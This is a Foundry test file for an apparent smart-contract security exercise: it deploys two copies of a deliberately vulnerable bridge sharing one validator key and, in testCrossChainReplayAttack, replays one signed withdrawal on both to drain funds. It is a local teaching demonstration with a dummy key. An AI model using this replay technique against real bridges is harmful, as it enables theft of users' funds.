// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/04_BridgeHack/VulnerableBridge.sol";
import "../src/04_BridgeHack/BridgeAttacker.sol";

contract BridgeHackTest is Test {
    VulnerableBridge public bridgeChainA;
    VulnerableBridge public bridgeChainB;
    BridgeAttacker public attacker;
    
    address public validator;
    address public user;
    address public attackerAddress;
    uint256 public validatorPrivateKey;
    
    function setUp() public {
        validatorPrivateKey = 0x1234;
        validator = vm.addr(validatorPrivateKey);
        
        user = makeAddr("user");
        attackerAddress = makeAddr("attacker");
        
        bridgeChainA = new VulnerableBridge(validator);
        bridgeChainB = new VulnerableBridge(validator);
        attacker = new BridgeAttacker();
        
        vm.deal(address(bridgeChainA), 100 ether);
        vm.deal(address(bridgeChainB), 100 ether);
        vm.deal(attackerAddress, 1 ether);
    }
    
    function testBridgeDeposit() public {
        vm.prank(user);
        vm.deal(user, 10 ether);
        bridgeChainA.deposit{value: 5 ether}();
        
        assertEq(bridgeChainA.deposits(user), 5 ether);
    }
    
    function testValidWithdraw() public {
        bytes32 withdrawalId = keccak256(abi.encodePacked("withdrawal1"));
        uint256 amount = 10 ether;
        
        bytes32 messageHash = keccak256(abi.encodePacked(user, amount, withdrawalId));
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        uint256 balanceBefore = user.balance;
        bridgeChainA.withdraw(user, amount, withdrawalId, signature);
        
        assertEq(user.balance, balanceBefore + amount);
    }
    
    function testCrossChainReplayAttack() public {
        bytes32 withdrawalId = keccak256(abi.encodePacked("withdrawal_cross_chain"));
        uint256 amount = 50 ether;
        
        bytes32 messageHash = keccak256(abi.encodePacked(attackerAddress, amount, withdrawalId));
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        console.log("=== Cross-Chain Replay Attack ===");
        console.log("Bridge A balance before:", address(bridgeChainA).balance);
        console.log("Bridge B balance before:", address(bridgeChainB).balance);
        console.log("Attacker balance before:", attackerAddress.balance);
        
        vm.startPrank(attackerAddress);
        
        attacker.exploitCrossChain(
            bridgeChainA,
            attackerAddress,
            amount,
            withdrawalId,
            signature,
            "Chain A (Ethereum)"
        );
        
        attacker.exploitCrossChain(
            bridgeChainB,
            attackerAddress,
            amount,
            withdrawalId,
            signature,
            "Chain B (BSC)"
        );
        
        vm.stopPrank();
        
        console.log("\n=== After Attack ===");
        console.log("Bridge A balance after:", address(bridgeChainA).balance);
        console.log("Bridge B balance after:", address(bridgeChainB).balance);
        console.log("Attacker balance after:", attackerAddress.balance);
        
        assertEq(address(bridgeChainA).balance, 50 ether);
        assertEq(address(bridgeChainB).balance, 50 ether);
        assertEq(attackerAddress.balance, 101 ether);
    }
}
